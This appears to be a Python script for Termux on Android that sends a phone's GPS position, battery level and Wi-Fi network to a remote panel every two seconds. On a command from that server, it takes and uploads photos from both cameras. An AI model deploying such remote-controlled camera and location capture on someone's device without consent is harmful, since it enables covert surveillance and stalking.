import time
import subprocess
import json
import requests
import os
import uuid
import base64
import threading
from datetime import datetime

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*50)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*50 + "\n")

# Posição - NUNCA reseta, mantém última válida
ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
gps_atualizado = False
gps_lock = threading.Lock()
headers_json = {"Content-Type": "application/json"}
inicio_operacao = datetime.now()

def obter_status_rede():
    wifi = run_command("termux-wifi-connectioninfo")
    if wifi:
        try:
            info = json.loads(wifi)
            ssid = info.get("ssid", "")
            if ssid and ssid != "<unknown ssid>":
                return f"WiFi: {ssid}"
        except: pass
    return "Dados Moveis"

def atualizar_gps():
    """Thread separada - NUNCA trava o loop principal"""
    global ultima_lat_valida, ultima_lon_valida, gps_atualizado
    while True:
        try:
            resultado = subprocess.run(
                "termux-location -p gps -r once",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if resultado.stdout:
                dados = json.loads(resultado.stdout.strip())
                lat = dados.get("latitude")
                lon = dados.get("longitude")
                if lat and lon and float(lat) != 0 and float(lon) != 0:
                    with gps_lock:
                        ultima_lat_valida = float(lat)
                        ultima_lon_valida = float(lon)
                        gps_atualizado = True
        except:
            pass
        time.sleep(10)  # Tenta GPS a cada 10 segundos

def capturar_e_enviar_foto(tipo, numero_camera):
    if os.path.exists(ARQUIVO_FOTO):
        os.remove(ARQUIVO_FOTO)
    
    subprocess.run(f"termux-camera-photo -c {numero_camera} {ARQUIVO_FOTO}", 
                   shell=True, timeout=5)
    time.sleep(1.5)
    
    if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
        with open(ARQUIVO_FOTO, "rb") as img_file:
            foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
        
        payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
        try:
            response = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers_json, timeout=20)
            return response.status_code == 200
        except:
            pass
    return False

# Inicia thread do GPS
threading.Thread(target=atualizar_gps, daemon=True).start()
print("🛰️  GPS em thread separada - Loop principal LIVRE!\n")

# Loop principal ULTRARRÁPIDO
while True:
    ciclo_inicio = time.time()
    timestamp_atual = datetime.now()
    
    # BATERIA
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try:
            bat_data = json.loads(out_bat)
            battery = str(bat_data.get("percentage", "N/A"))
        except: pass
    
    # PEGA POSIÇÃO ATUAL (sem esperar GPS)
    with gps_lock:
        lat = ultima_lat_valida
        lon = ultima_lon_valida
        gps_ok = gps_atualizado
        gps_atualizado = False  # Reseta flag
    
    # UPTIME
    uptime = str(datetime.now() - inicio_operacao).split('.')[0]
    
    # REDE
    rede = obter_status_rede()
    
    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "uptime": uptime,
        "lat": lat,
        "lon": lon,
        "network": rede,
        "timestamp": timestamp_atual.isoformat()
    }
    
    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=3)
        if response.status_code == 200:
            res_data = response.json()
            comando_cam = str(res_data.get("comando_cam", "wait")).lower()
            
            gps_icon = "📍" if gps_ok else "📡"
            ciclo_tempo = time.time() - ciclo_inicio
            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% {rede} | {ciclo_tempo:.1f}s")
            
            if comando_cam == "take_dual":
                print("📸 [DUAL] Capturando...")
                ok1 = capturar_e_enviar_foto("back", 0)
                ok2 = capturar_e_enviar_foto("front", 1)
                
                if ok1 and ok2:
                    print("   ✅ Fotos enviadas!")
                elif ok1 or ok2:
                    print("   ⚠️ Apenas uma foto")
                else:
                    print("   ❌ Falha")
                
                if os.path.exists(ARQUIVO_FOTO):
                    os.remove(ARQUIVO_FOTO)
    except Exception as e:
        print(f"⚠️ {str(e)[:40]}")
    
    time.sleep(2.0)
